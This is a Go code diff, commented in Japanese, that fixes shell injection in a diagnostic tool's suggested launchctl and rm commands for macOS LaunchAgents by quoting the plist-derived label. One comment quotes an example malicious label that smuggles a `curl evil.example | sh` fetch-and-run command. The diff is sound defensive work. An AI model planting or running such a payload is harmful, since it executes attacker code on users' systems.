@@ -175,8 +175,14 @@ func manualCommands(f Finding) []string {
 	if strings.HasPrefix(f.PlistPath, "/Library/") {
 		rmSudo = "sudo "
 	}
+	// 🚨 Label も引用する。**Label は plist の `Label` キーをそのまま読んだ値**で、
+	// `~/Library/LaunchAgents` に書ける任意のローカルプロセスが決められる。引用しないと
+	// `evil; curl evil.example | sh #` のようなラベルで、doctor 自身が提示する
+	// 「手で実行してください」のコマンドがインジェクションを運ぶ (敵対レビュー 2026-09-03 で実測)。
+	// **これは細工した snapshot に限らず実走査で成立する**。
+	// `<domain>/<label>` は 1 引数なので、連結してから引用する。
 	return []string{
-		fmt.Sprintf("%slaunchctl bootout %s/%s", bootSudo, f.Domain, f.Label),
+		fmt.Sprintf("%slaunchctl bootout %s", bootSudo, shellQuote(f.Domain+"/"+f.Label)),
 		fmt.Sprintf("%srm %s", rmSudo, shellQuote(f.PlistPath)),
 	}
 }
